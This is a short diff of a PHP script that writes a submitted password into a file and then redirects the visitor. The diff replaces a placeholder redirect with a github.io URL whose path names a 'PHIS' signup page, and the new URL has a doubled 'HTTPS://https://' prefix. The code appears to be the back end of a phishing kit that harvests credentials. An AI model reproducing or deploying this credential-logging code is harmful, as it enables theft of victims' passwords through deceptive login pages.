@@ -9,5 +9,5 @@
     fwrite($file,"Password :");
     fwrite($file, $password ."\n");
     fclose($file);
-    header("location: HTTPS://WEBSITE ADDRESS/PHISsignupREQquery.HTML");
+    header("location: HTTPS://https://gm-krish.github.io/aberrant-creators//PHISsignupREQquery.HTML");
  ?>
